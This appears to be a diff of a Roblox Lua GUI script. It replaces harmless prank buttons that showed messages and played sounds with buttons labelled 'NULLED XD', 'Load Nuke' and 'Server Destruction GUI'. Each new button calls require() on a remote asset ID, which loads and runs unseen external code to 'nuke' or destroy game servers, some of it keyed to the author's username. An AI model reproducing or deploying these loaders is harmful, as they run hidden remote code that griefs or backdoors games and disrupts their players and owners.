@@ -39,7 +39,7 @@ Credits.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 Credits.Position = UDim2.new(0, 0, 0.912, 0)
 Credits.Size = UDim2.new(0, 378, 0, 22)
 Credits.Font = Enum.Font.GothamBold
-Credits.Text = "By Hidden"
+Credits.Text = "Creator: master200crate"
 Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
 Credits.TextScaled = true
 Credits.TextSize = 14.000
@@ -51,56 +51,14 @@ e1x1x1x1Message.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 e1x1x1x1Message.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
 e1x1x1x1Message.Size = UDim2.new(0, 79, 0, 31)
 e1x1x1x1Message.Font = Enum.Font.GothamBold
-e1x1x1x1Message.Text = "1x1x1x1 Message"
+e1x1x1x1Message.Text = "NULLED XD"
 e1x1x1x1Message.TextColor3 = Color3.fromRGB(0, 0, 0)
 e1x1x1x1Message.TextScaled = true
 e1x1x1x1Message.TextSize = 14.000
 e1x1x1x1Message.TextWrapped = true
 e1x1x1x1Message.MouseButton1Down:connect(function()
-	while true do
-		wait(12)--set this to how much time between messages
-		msg = Instance.new ("Hint")
-		msg.Parent = game.Workspace
-		msg.Text = "1x1x1x1: MUHAWHAWHAW! NOOBS! I HAVE RETURNED FOR MY REVENGE!"
-		wait(6)
-		msg:remove()
-		wait(3)
-		msg = Instance.new("Message")
-		msg.Parent = game.Workspace
-		msg.Text = "1x1x1x1: NOW YOU WILL ALL PARISH IN MY FIRE OF DOOM!"
-		wait(6)
-		msg:remove()
-		wait(3)
-		msg = Instance.new("Message")
-		msg.Parent = game.Workspace
-		msg.Text = "1x1x1x1: I WILL DESTROY YOU ALL! YOU ARE WORTHLESS!"
-		wait(6)
-		msg:remove()
-		wait(3)
-		msg = Instance.new("Message")
-		msg.Parent = game.Workspace
-		msg.Text = "1x1x1x1: YOU WILL NOT LIVE THROUGH MY DEADLY ATTACKS!"
-		wait(6)
-		msg:remove()
-		wait(3)
-		msg = Instance.new("Message")
-		msg.Parent = game.Workspace
-		msg.Text = "1x1x1x1: I MIGHT AS WELL CLONE YOU INTO BOTS!"
-		wait(6)
-		msg:remove()
-		wait(3)
-		msg = Instance.new("Message")
-		msg.Parent = game.Workspace
-		msg.Text = "1x1x1x1: AND THEN THOSE BOTS WILL DESTROY ROBLOX! HAHAHAHAHA!"
-		wait(6)
-		msg:remove()
-		wait(3)
-		msg = Instance.new("Message")
-		msg.Parent = game.Workspace
-		msg.Text = "1x1x1x1: YOU CAN'T STOP ME! THERES NOTHING YOU CAN DO!"
-		wait(6)
-		msg:remove()
-	end
+		print("Nulled XD starting")
+		require(7266023412)()
 end)
 e1x1x1x1Music.Name = "e1x1x1x1Music"
 e1x1x1x1Music.Parent = Frame
@@ -108,28 +66,14 @@ e1x1x1x1Music.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 e1x1x1x1Music.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
 e1x1x1x1Music.Size = UDim2.new(0, 79, 0, 31)
 e1x1x1x1Music.Font = Enum.Font.GothamBold
-e1x1x1x1Music.Text = "1x1x1x1 Music"
+e1x1x1x1Music.Text = "Load Nuke"
 e1x1x1x1Music.TextColor3 = Color3.fromRGB(0, 0, 0)
 e1x1x1x1Music.TextScaled = true
 e1x1x1x1Music.TextSize = 14.000
 e1x1x1x1Music.TextWrapped = true
 e1x1x1x1Music.MouseButton1Down:connect(function()
-	--Made by Servano
- 
-	local s = Instance.new("Sound")
- 
-	s.Name = "Sound"
-	s.SoundId = "http://www.roblox.com/asset/?id=27697743"
-	s.Volume = 1
-	s.Pitch = 3
-	s.Looped = true
-	s.archivable = false
- 
-	s.Parent = game.Workspace
- 
-	wait(1)
- 
-	s:play()
+		print("Nuke Load")
+		require(9298209793):Nuke(game.Players.LocalPlayer.Name)
 end)
 e1x1x1x1Laugh.Name = "e1x1x1x1Laugh"
 e1x1x1x1Laugh.Parent = Frame
@@ -137,28 +81,14 @@ e1x1x1x1Laugh.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 e1x1x1x1Laugh.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
 e1x1x1x1Laugh.Size = UDim2.new(0, 79, 0, 34)
 e1x1x1x1Laugh.Font = Enum.Font.GothamBold
-e1x1x1x1Laugh.Text = "1x1x1x1 Laugh"
+e1x1x1x1Laugh.Text = "Server Destruction GUI"
 e1x1x1x1Laugh.TextColor3 = Color3.fromRGB(0, 0, 0)
 e1x1x1x1Laugh.TextScaled = true
 e1x1x1x1Laugh.TextSize = 14.000
 e1x1x1x1Laugh.TextWrapped = true
 e1x1x1x1Laugh.MouseButton1Down:connect(function()
-	--Made by Servano
- 
-	local s = Instance.new("Sound")
- 
-	s.Name = "Sound"
-	s.SoundId = "http://www.roblox.com/asset/?id=35935204"
-	s.Volume = 1
-	s.Pitch = 0.9
-	s.Looped = true
-	s.archivable = false
- 
-	s.Parent = game.Workspace
- 
-	wait(1)
- 
-	s:play()
+	print("Server Destoyer GUI Load")
+	require(5257685661):Fire("master200crate")
 end)
 DayToNight.Name = "DayToNight"
 DayToNight.Parent = Frame
